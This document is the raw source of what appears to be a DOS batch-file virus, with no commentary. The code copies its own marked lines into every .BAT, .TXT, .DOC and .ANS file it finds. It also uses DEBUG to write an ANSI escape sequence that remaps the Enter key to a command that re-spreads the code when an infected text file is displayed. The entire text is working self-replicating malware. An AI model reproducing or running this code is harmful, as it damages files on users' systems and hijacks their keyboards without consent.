::[8m TxT_
@echo off%_TxT_%
if '%1=='TxT_ goto TxT_
if '%1=='Bat goto TxT_Bat
if not '%0=='\txT_ goto TxT_InBat
echo [13;13p %_TxT_%
cls %_TxT_%
::[7A TxT_
:TxT_Search
for %%v in (*.BAT *.TXT *.DOC *.ANS) do call \TxT_ TxT_ %%v
goto TxT_end
:TxT_InBat
if exist \TxT_.bat goto TxT_Search
if not exist %0.bat goto TxT_end
find "TxT_"<%0.bat>\TxT_.bat
goto TxT_Search
:TxT_ [9A
find "TxT_"<%2>nul
if not errorlevel 1 goto TxT_end
find "TxT_"<\TxT_.bat>>%2
:: [4A TxT_
echo e 13A "                        ">TxT_.tmp
echo e 100 3A 3A 1B "[13" 3B 22 03 "find /i">>TxT_.tmp
echo e 110 20 22 3B 33 34 3B 22 "txt_" 22 3B 33 34 3B 22 3C>>TxT_.tmp
echo e 122 "%2" 3E "\txt_.bat" 22 3B "13" 3B """\txT_""" 3B "13p" 1B "[0m" 0A 0D>>TxT_.tmp
echo n TxT_.tmn>>TxT_.tmp
echo r cx>>TxT_.tmp
:: [7A TxT_
echo 50>>TxT_.tmp
echo w>>TxT_.tmp
echo q>>TxT_.tmp
debug<TxT_.tmp>nul
type TxT_.tmn>>%2
del TxT_.tm?
:TxT_end [4A
::[13;"find /i ";34;"txt_";34;"<TEXTVIR2.FIL>\txt_.bat";13;"\txT_";13p[0m